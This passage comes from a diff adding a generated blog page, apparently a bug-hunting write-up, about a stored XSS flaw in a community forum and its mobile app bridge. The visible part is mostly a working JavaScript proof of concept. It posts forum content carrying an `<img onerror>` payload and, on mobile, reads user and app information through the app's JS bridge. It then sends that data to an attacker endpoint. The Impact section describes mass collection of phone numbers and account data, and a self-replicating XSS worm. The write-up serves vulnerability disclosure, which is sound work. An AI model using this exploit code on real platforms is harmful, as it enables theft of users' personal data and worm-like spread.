+        "content":"&lt;div id=\"mobile_article_theme_warm\" class=\"content_markdown_body\"&gt;&lt;p&gt;如题&lt;img src=x onerror=alert(document.domain)&gt;&lt;/p&gt;&lt;/div&gt;",
+        "device_name":"Web",
+        "watermark":true,
+        "media":[],
+        "publish_type":"post"
+    }
+    res = await myPostFetch('https://sowellwell.com/w/v1/community/post/new', deviceid, payload)
+}
+
+// 获取手机客户端用户信息
+const getUserInfo = async function(){
+    UUJSSDK.Bridge({api: "get_user_info",cbname: "get_user_info_cb",done: function(res) {
+        console.log(res["result"])
+        var encoded = encode(JSON.stringify(res["result"]))
+        UUJSSDK.Bridge({
+            api: "get_app_info",
+            params: {},
+            done: function(res2) {
+                var encoded2 = encode(JSON.stringify(res2))
+                justSend(api_burp+'?userinfo='+encoded+'&amp;appinfo='+encoded2)
+            }
+        });
+    }})
+}
+// 判断pc端还是手机端
+const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+if (isMobile) {
+/* your code here */
+    getUserInfo()
+    
+}else{
+    startSend()
+    startSendPost()
+}
+</code></pre></div></div>
+
+<h2 id="impact">Impact</h2>
+<ol>
+  <li>攻击者可以在论坛嵌入XSS脚本，大规模收集平台用户手机号和账号信息，造成敏感信息泄漏；</li>
+  <li>攻击者可以在论坛嵌入XSS脚本，伪造用户发帖、评论等，制造XSS蠕虫，实现XSS帖子的自我复制，扩大影响。</li>
+</ol>
+
+<h2 id="patch-advice">Patch advice</h2>
+<ol>
+  <li>对用户的输入进行过滤</li>
+</ol>
+
+
+  </div><a class="u-url" href="/xss/2023/09/15/uu-xss.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">sunriseXu&#39;s bug hunting journey</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">sunriseXu&#39;s bug hunting journey</li><li><a class="u-email" href="mailto:github@example.com">github@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>sunriseXu&#39;s bug hunting journey, sharing new findings of bug hunting.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
